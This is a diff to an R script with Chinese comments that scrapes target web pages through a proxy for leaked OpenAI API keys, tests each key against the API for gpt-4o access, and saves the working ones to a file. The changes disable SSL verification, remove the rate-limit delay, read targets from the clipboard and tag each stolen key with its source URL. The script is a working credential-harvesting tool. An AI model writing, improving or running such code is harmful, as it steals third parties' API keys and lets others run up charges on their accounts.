@@ -7,6 +7,7 @@ if (!require(jsonlite)) install.packages("jsonlite", dependencies = TRUE)
 library(httr)
 library(stringr)
 library(jsonlite)
+library(crayon)
 
 # 配置代理设置
 proxy <- use_proxy(url = "127.0.0.1", port = 7890)
@@ -15,8 +16,7 @@ proxy <- use_proxy(url = "127.0.0.1", port = 7890)
 # proxy <- use_proxy(url = "127.0.0.1", port = 7890, username = "your_username", password = "your_password")
 
 # 目标 IP 列表
- target_urls <- paste0(unique(read.table("base_url.txt",sep = "\t")$V1))  # 替换为实际的 URL
-#target_urls <- paste0("https://namesgenerator.ai/")  # 替换为实际的 URL
+target_urls <- read.table("clipboard", sep = "\t")[[1]]
 
 # 定义用于验证 OpenAI 密钥的函数
 validate_key <- function(key, proxy) {
@@ -105,8 +105,8 @@ valid_gpt4_keys <- c()
 
 # 检查请求状态并提取内容
 for (i in target_urls) {
-  # 发送 GET 请求，同时使用代理
-  response <- try(GET(i, proxy, timeout(10)), silent = TRUE)
+  # 发送 GET 请求，同时使用代理，并禁用 SSL 验证
+  response <- try(GET(i, proxy, timeout(10), config(ssl_verifypeer = FALSE)), silent = TRUE)
   
   if (inherits(response, "try-error")) {
     cat("无法访问 URL:", i, "请求失败。\n")
@@ -129,8 +129,9 @@ for (i in target_urls) {
       
       if (validation_result$is_valid) {
         if (validation_result$has_gpt4) {
-          cat("密钥有效，并支持 gpt-4o。\n")
-          valid_gpt4_keys <- c(valid_gpt4_keys, key)
+          cat(red("密钥有效，并支持 gpt-4o。\n"))
+          a=key%>%setNames(i)
+          valid_gpt4_keys <- c(valid_gpt4_keys, a)
         } else {
           cat("密钥有效，但不支持 gpt-4o。\n")
         }
@@ -138,24 +139,22 @@ for (i in target_urls) {
         cat("密钥无效或请求失败，跳过。\n")
       }
       
-      # 可选：为避免触发速率限制，添加短暂的延迟
-      Sys.sleep(1)
     }
     
   } else {
-    cat("无法访问 URL:", i, "状态码:", status_code(response), "\n")
+    cat("无法访问 URL:", i, "状态 码:", status_code(response), "\n")
   }
 }
-valid_gpt4_keys<-unique(valid_gpt4_keys)
+valid_gpt4_keys <- valid_gpt4_keys[!duplicated(valid_gpt4_keys)]
+
 # 输出所有有效且支持 gpt-4o 的密钥
 if (length(valid_gpt4_keys) > 0) {
   cat("找到", length(valid_gpt4_keys), "个有效且支持 gpt-4o 的密钥：\n")
   print(valid_gpt4_keys)
   
   # 可选：将有效密钥保存到文件
-  writeLines(valid_gpt4_keys, "valid_gpt4_keys.txt")
+  writeLines(valid_gpt4_keys, "valid_gpt4_keys.txt") 
   cat("有效密钥已保存到 'valid_gpt4_keys.txt'\n")
 } else {
   cat("未找到有效且支持 gpt-4o 的密钥。\n")
 }
-
